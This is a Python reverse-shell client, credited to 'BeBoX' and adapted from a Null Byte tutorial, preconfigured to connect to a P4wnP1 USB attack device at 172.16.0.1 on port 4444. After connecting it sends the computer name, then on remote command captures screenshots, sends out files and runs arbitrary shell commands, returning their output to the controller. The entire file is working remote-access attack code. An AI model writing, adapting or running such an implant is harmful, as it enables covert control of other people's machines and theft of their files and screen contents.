# nullByte client shell
# source : https://null-byte.wonderhowto.com/how-to/reverse-shell-using-python-0163875/
# corrected, modified,arranged  by BeBoX
# preconfigured to work with P4wnP1 over Rndis usb default IP
# fixed bug of null byte in args and other errors
import socket, os, subprocess, pyautogui
def sendpic():
    pyautogui.screenshot('filename.png')
    cheminImage = "filename.png"
    fichierImage = open(cheminImage, "rb")
    tailleImage = str(os.path.getsize(cheminImage))
    for i in range(8-len(tailleImage)):
        tailleImage = "0"+ tailleImage
    s.send(tailleImage.encode())
    send(fichierImage.read())
    #send(str.encode('ok'))
def sendfile(filename):
    cheminImage = filename
    fichierImage = open(cheminImage, "rb")
    tailleImage = str(os.path.getsize(cheminImage))
    print(filename +' : ' + tailleImage + 'bytes') 
    for i in range(8-len(tailleImage)):
        tailleImage = "0"+ tailleImage
    s.send(tailleImage.encode())
    send(fichierImage.read())
    #send(str.encode('ok'))
def connect():
    os.system('cls')
    global host
    global port
    global s
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    port = 4444
    host = '172.16.0.1'
    try:
        print('Developement vesion by BeBoX reverse shell for P4wnP1')
        print('[!] trying to connect to %s:%s'%(host,port))
        s.connect((host,port))
        print('[*] Connection established.')
        nom = os.environ['COMPUTERNAME']
        my_str_as_bytes = str.encode(nom)
        s.send(my_str_as_bytes)
    except socket.error as msg:
        print('Could not connect. :'+ str(msg[0]))
def receive():
    receive = s.recv(1024).decode()
    if receive == 'exit':
        s.close()
        exit()
    elif receive == 'ok':
        args = str.encode('ok')
    elif receive == 'shot':
        sendpic()
    elif receive[:5] == 'dwnld':
        try:
            with open(receive[6:]):
                #close(receive[6:])
                sendfile(receive[6:])
        except IOError:
            # erreur io
            print('error : %s can\'t be opened'%(receive[6:]))
            args=str.encode("00000000")
    elif receive[0:5] == 'shell':
        proc2 = subprocess.Popen(receive[6:], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        stdout_value = proc2.stdout.read() + proc2.stderr.read()
        args = stdout_value 
        if len(args) == 0 :
            args = str.encode(' ')
    else:
        args = str.encode('no valid input was given.')    
    if len(args) == 0:
        print('error')
        args = str.encode('no valid input was given.') 
    send(args)
def send(args):
    send = s.send(args)
    receive()
def main():
    connect()
    receive()
    s.close()
main()